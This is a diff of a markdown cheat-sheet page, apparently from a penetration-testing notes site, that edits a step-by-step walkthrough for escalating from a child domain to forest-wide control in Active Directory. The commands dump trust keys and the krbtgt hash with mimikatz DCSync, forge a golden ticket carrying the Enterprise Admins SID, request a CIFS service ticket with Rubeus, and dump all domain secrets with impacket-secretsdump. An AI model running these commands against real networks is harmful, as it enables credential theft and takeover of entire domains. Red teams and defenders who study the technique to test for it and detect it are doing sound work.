@@ -11,8 +11,6 @@ tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "W
 
 #### 1. Check trust relationships
 
-<div>
-
 ```console
 # Get all trusted domain objects in a forest
 Get-ADTrust -Filter *
@@ -28,50 +26,32 @@ nltest /domain_trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 
-</div>
-
 #### 2. Get current and target domain SID
 
-<div>
-
 ```console
-./mimikatz.exe 'lsadump::trust' 'exit'
+.\mimikatz.exe 'lsadump::trust' 'exit'
 ```
-
-</div>
 
 #### 3. Get krbtgt hash of current domain
 
-<div>
-
 ```console
-./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
+.\mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
 ```
-
-</div>
 
 #### 4. Forge a golden ticket
 
-<div>
-
 ```console
-# Append '-519' to target domain SID
-./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi' 'exit'
+# Append '-519' to target domain SID (Enterprise Admins Group)
+.\mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi' 'exit'
 ```
 
 <small>*Note: Try different high value hashes if failed*</small>
 
-</div>
-
-#### 5. Request a tgt ticket of target domain
-
-<div>
+#### 5. Request a service ticket of target domain
 
 ```console
-./rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
+.\rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -83,34 +63,24 @@ nltest /domain_trusts
 
 #### 1. Convert kirbi to ccache
 
-<div>
-
 ```console
-python3 rubeustoccache.py <BASE64_TICKET_2> secrets.kirbi secrets.ccache
+python3 rubeustoccache.py <BASE64_TICKET> administrator.kirbi administrator.ccache
 ```
-
-</div>
 
 #### 2. Secrets Dump
 
-<div>
-
 ```console
-export KRB5CCNAME=secrets.ccache
+export KRB5CCNAME=administrator.ccache
 ```
 
 ```console
 impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
-</div>
-
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
-
-<div>
 
 #### 1. TO-DO
 
@@ -118,8 +88,4 @@ impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 TO-DO
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
